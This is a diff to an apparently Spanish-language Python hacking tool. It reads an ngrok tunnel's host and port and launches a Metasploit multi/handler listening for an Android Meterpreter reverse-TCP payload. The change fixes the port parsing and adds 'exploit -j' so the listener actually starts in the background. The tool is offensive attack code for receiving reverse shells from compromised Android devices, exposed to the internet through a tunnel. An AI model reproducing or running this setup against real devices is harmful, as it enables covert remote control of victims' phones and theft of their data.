@@ -175,7 +175,7 @@ def ngrok():
  banner()
  print(f"{color.morado}NGROK ESTA ARRANCANDO......")
  host=(r[89:103])
- port=(r[104:108:])
+ port=(r[104:109:])
  if len(host) == 0:
   banner()
   print(f"""
@@ -198,7 +198,7 @@ def msf():
  banner()
  if var == 0:
    banner()
-   os.system('msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp ; set lhost 127.0.0.1; set lport 4444;set ExitOnSession false"')
+   os.system('msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp ; set lhost 127.0.0.1; set lport 4444;set ExitOnSession false;exploit -j "')
  else :
    print(f"""{color.rojo}
           METASPLOIT NO ESTA INSTALADO 
